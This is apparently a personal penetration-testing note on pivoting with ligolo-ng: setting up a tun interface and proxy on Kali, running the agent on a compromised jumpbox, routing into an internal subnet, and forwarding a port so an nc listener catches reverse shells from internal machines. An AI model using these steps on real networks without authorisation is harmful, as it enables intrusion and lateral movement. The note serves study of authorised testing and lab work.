# Download
---
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.1

# Setup on Kali
----
- **Create a tunnel interface to work with ligolo-ng** (needs to be done every time)
	- `sudo ip tuntap add user drasstrange mode tun ligolo`
	- `sudo ip link set ligolo up`
	- ![[Pasted image 20250509155200.png]]
- Run **Proxy on Kali**:
	- `./proxy -selfcert`

# Setup on Compromised Victim / Jumpbox (with Public IP)
---
![[Pasted image 20250509154740.png]]

- We are trying to access `10.0.1.0/24`IP
- Copy the **ligolo-ng agent here and run**:
	- `./agent -connect <our_ip>:<port_to_connect_with> -ignore-cert`For ex:-
		- `/agent -connect 10.50.82.176:11601 -ignore-cert`
	- ![[Pasted image 20250509161837.png]]
	- ![[Pasted image 20250509161931.png]]
- **Select the session** using: `session` and enter
	- ![[Pasted image 20250509164759.png]]
- **Add a networking route**:
	- `sudo ip route add <NETWORK_IP>/<SUBNET> dev ligolo`
		- `sudo ip route add 10.0.1.0/24 dev ligolo`
- **Start the tunnel in ligolo-ng terminal**:
	- `start`
	- ![[Pasted image 20250509164905.png]]

# Reverse connection from Internal machines
---
- **Forward Network Traffic on port 30000 on jumpbox to port 10000 of Kali machine**
- `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`
	- `0.0.0.0:30000` -> Binding Address on jumpbox
	- `127.0.0.1:10000` -> Forwarded to our port 1000
- `nc -lnvp 10000` => On Kali
- We would try to **connect locally on port 30000 of jumpbox on our internal network machine as it would be forwarded to 10000 of Kali** 